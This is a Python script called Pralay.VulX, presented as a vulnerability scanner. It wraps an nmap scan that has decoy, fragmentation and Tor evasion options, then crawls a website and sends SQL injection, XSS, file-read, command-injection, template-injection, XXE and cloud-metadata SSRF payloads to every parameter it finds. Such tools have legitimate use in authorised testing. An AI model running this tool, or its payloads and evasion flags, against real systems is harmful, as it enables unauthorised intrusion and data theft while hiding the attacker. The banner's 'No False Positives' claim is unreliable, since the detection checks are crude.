#!/usr/bin/env python3
"""
Pralay.VulX - Ultimate Vulnerability Scanner
Author: Vimal Bijalwan
Version: 3.1 (No False Positives)
"""

import sys
import subprocess
import requests
import argparse
import time
from datetime import datetime
from urllib.parse import urljoin
from bs4 import BeautifulSoup

BANNER = r"""
╔══════════════════════════════════════════════════════════════════╗
║    ██████╗ ██████╗  █████╗ ██╗      █████╗ ██╗   ██╗             ║
║    ██╔══██╗██╔══██╗██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝             ║
║    ██████╔╝██████╔╝███████║██║     ███████║ ╚████╔╝              ║
║    ██╔═══╝ ██╔══██╗██╔══██║██║     ██╔══██║  ╚██╔╝               ║
║    ██║     ██║  ██║██║  ██║███████╗██║  ██║   ██║                ║
║    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝                ║
║              PRALAY.VULX - Vimal Bijalwan Ed.                   ║
║        "Real Vulns with Severity - No Fake Alerts"               ║
╚══════════════════════════════════════════════════════════════════╝
"""

COMMON_PARAMS = [
    "id", "user", "username", "email", "pass", "password", "q", "search", "s", "page",
    "file", "doc", "folder", "path", "redirect", "url", "link", "goto", "return",
    "debug", "test", "admin", "lang", "cat", "category", "product", "pid", "uid",
    "aid", "bid", "cid", "did", "eid", "fid", "gid", "hid", "iid", "jid", "kid",
    "lid", "mid", "nid", "oid", "pid", "qid", "rid", "sid", "tid", "uid", "vid",
    "wid", "xid", "yid", "zid", "data", "json", "xml", "callback", "callback_func"
]

VULN_DEFS = {
    "SQLi": {
        "payloads": ["'", "\"", "1' OR '1'='1", "1 AND 1=1", "1 AND 1=2", "' OR '1'='1' --"],
        "detect": lambda text: any(err in text.lower() for err in ["sql syntax", "mysql_fetch", "ora-", "postgresql error", "unclosed quotation mark"]),
        "severity": "CRITICAL"
    },
    "XSS": {
        "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"],
        "detect": lambda text, payload: payload.lower() in text.lower(),
        "severity": "HIGH"
    },
    "LFI": {
        "payloads": ["../../../../etc/passwd", "/etc/passwd", "../../../../../../etc/passwd"],
        "detect": lambda text: "root:x:" in text or "bin/bash" in text,
        "severity": "HIGH"
    },
    "RCE": {
        "payloads": ["; id", "| id", "`id`", "$(id)"],
        "detect": lambda text: "uid=" in text and "gid=" in text,
        "severity": "CRITICAL"
    },
    "SSTI": {
        "payloads": ["{{7*7}}", "${7*7}", "{{7*'7'}}", "<% 7*7 %>"],
        "detect": lambda text, payload: "49" in text and payload not in text and "7*7" not in text,
        "severity": "HIGH"
    },
    "XXE": {
        "payloads": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
        "detect": lambda text: "root:x:" in text,
        "severity": "CRITICAL"
    },
    "SSRF": {
        "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin"],
        "detect": lambda text: "ami-id" in text or "instance-id" in text,
        "severity": "HIGH"
    }
}

def run_nmap_scan(target, ports, stealth=False, tor=False):
    cmd = ["nmap", "-sV", "--script", "vulners", "-v", "-p", ports, target]
    if stealth:
        cmd += ["-T1", "-f", "--data-length", "200", "-D", "RND:10", "--source-port", "53"]
    if tor:
        cmd = ["proxychains4", "-q"] + cmd
    print(f"[*] Running: {' '.join(cmd)}\n")
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    out = []
    for line in proc.stdout:
        print(line, end='')
        out.append(line)
    proc.wait()
    return ''.join(out)

def crawl_params(start_url, depth=1):
    print(f"[*] Crawling {start_url}...")
    visited = set()
    params = set()
    queue = [(start_url, 0)]
    while queue:
        url, d = queue.pop(0)
        if url in visited or d > depth:
            continue
        visited.add(url)
        print(f"[*] Found {len(params)} parameters so far", end='\r')
        try:
            resp = requests.get(url, timeout=5, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                full = urljoin(url, link['href'])
                if full.startswith(start_url) and full not in visited:
                    queue.append((full, d+1))
            for form in soup.find_all('form'):
                action = form.get('action')
                form_url = urljoin(url, action) if action else url
                method = form.get('method', 'get').lower()
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name:
                        params.add((form_url, method, name))
        except:
            continue
    print(f"\n[*] Total parameters: {len(params)}")
    return list(params)

def fuzz_params(params, delay=0.05):
    findings = []
    total = len(params) * sum(len(v["payloads"]) for v in VULN_DEFS.values())
    curr = 0
    print(f"\n[*] Starting fuzzing ({total} requests)...")
    for idx, (url, method, param) in enumerate(params, 1):
        for vuln_type, data in VULN_DEFS.items():
            for payload in data["payloads"]:
                curr += 1
                pct = curr / total * 100
                sys.stdout.write(f"\r[*] Progress: {pct:.1f}% | Param {idx}/{len(params)}: {param} | Testing {vuln_type}")
                sys.stdout.flush()
                try:
                    full = f"{url}?{param}={payload}"
                    resp = requests.get(full, timeout=3, verify=False)
                    text = resp.text
                    if vuln_type in ["XSS", "SSTI"]:
                        if data["detect"](text, payload):
                            findings.append((vuln_type, url, param, payload, data["severity"]))
                    else:
                        if data["detect"](text):
                            findings.append((vuln_type, url, param, payload, data["severity"]))
                except:
                    pass
                time.sleep(delay)
    print("\n[*] Fuzzing complete.")
    return findings

def generate_report(target, cves, web_findings, stealth, tor):
    report = f"""
{BANNER}
╔══════════════════════════════════════════════════════════╗
║                     SCAN REPORT                          ║
║ Target : {target}                                         
║ Time   : {datetime.now()}                                 
║ Stealth: {stealth} | Tor: {tor}                          
╚══════════════════════════════════════════════════════════╝
"""
    if not cves and not web_findings:
        report += "\n[✓] No vulnerabilities detected.\n"
    if cves:
        report += "\n🔴 CVEs (Network Level):\n" + "-"*50 + "\n"
        for c in cves:
            report += f"[+] {c['service']} | {c['cve_id']} | CVSS: {c['cvss']} | Severity: {c['severity']}\n"
    if web_findings:
        report += "\n🌐 WEB VULNERABILITIES (Parameter Based):\n" + "-"*70 + "\n"
        for vuln_type, url, param, payload, sev in web_findings:
            report += f"[{sev}] {vuln_type} at {url}\n    Parameter: {param} = {payload}\n\n"
    print(report)
    fname = f"PralayVulX_report_{target.replace('/', '_')}.txt"
    with open(fname, "w") as f:
        f.write(report)
    print(f"[*] Report saved: {fname}")

def main():
    print(BANNER)
    p = argparse.ArgumentParser()
    p.add_argument("target", help="IP or hostname")
    p.add_argument("--ports", default="1-1000")
    p.add_argument("--crawl-url", help="Base URL for crawling + fuzzing")
    p.add_argument("--stealth", action="store_true")
    p.add_argument("--tor", action="store_true")
    p.add_argument("--no-nmap", action="store_true")
    args = p.parse_args()

    cves = []
    web_findings = []

    if not args.no_nmap:
        out = run_nmap_scan(args.target, args.ports, args.stealth, args.tor)
        for line in out.splitlines():
            if "CVE-" in line and "vulners" in line:
                parts = line.split()
                if len(parts) >= 3:
                    cve = parts[1]
                    try:
                        score = float(parts[2])
                    except:
                        score = 0.0
                    sev = "CRITICAL" if score>=9 else "HIGH" if score>=7 else "MEDIUM" if score>=4 else "LOW"
                    cves.append({"cve_id": cve, "cvss": score, "severity": sev, "service": "detected"})

    if args.crawl_url:
        params = crawl_params(args.crawl_url, depth=1)
        if not params:
            params = [(args.crawl_url, "get", p) for p in COMMON_PARAMS]
        web_findings = fuzz_params(params, delay=0.05)

    generate_report(args.target, cves, web_findings, args.stealth, args.tor)

if __name__ == "__main__":
    main()
